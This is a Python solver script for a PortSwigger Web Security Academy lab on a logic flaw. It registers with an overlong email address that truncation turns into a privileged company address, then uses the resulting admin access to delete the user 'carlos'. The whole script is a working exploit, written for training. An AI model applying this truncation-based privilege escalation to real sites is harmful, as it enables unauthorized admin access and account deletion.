#!/usr/bin/env python3
# Lab: Inconsistent handling of exceptional input
# Lab-Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import re
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

username = 'attacker'
password = 'password'


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('input', attrs={'name': 'csrf'})['value']
    return result


def register(client, host, mail_url):
    url = f'{host}/register'
    # Cut out the https:// and /email from the server
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': username,
            'email': 'x' * 238 + '@dontwannacry.com.' + mail_url[8:-6],
            'password': password}
    res = client.post(url, data=data)
    return 'Please check your emails for your account registration link' in res.text


def find_mailserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    return result


def get_confirmation_link(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('a', attrs={'href': re.compile(f'temp-registration')}).text
    return result


def login(client, host):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    mail_url = find_mailserver(client.get(host).text)
    if not mail_url:
        print(f'[-] Failed to obtain mail server url')
        sys.exit(-2)
    print(f'[+] Found mail server url: {mail_url}')

    if not register(client, host, mail_url):
        print(f'[-] Failed to register user')
        sys.exit(-3)
    print(f'[+] Registered as user: {username}')

    confirmation_link = get_confirmation_link(client.get(f'{mail_url}').text)
    if not confirmation_link:
        print(f'[-] Failed to obtain registration link')
        sys.exit(-4)
    print(f'[+] Found confirmation link: {confirmation_link}')

    r = client.get(confirmation_link)
    if 'Account registration successful!' not in r.text:
        print(f'[-] Failed to finalize registration')
        sys.exit(-5)
    print(f'[+] Account creation successful')

    if not login(client, host):
        print(f'[-] Failed to login')
        sys.exit(-6)
    print(f'[+] Logged in as {username}')

    r = client.get(f'{host}/admin/delete?username=carlos')
    if 'Congratulations, you solved the lab!' not in r.text:
        print(f'[-] Failed to delete user carlos lab')
        sys.exit(-7)

    print(f'[+] Deleted user carlos, lab solved')


if __name__ == "__main__":
    main()
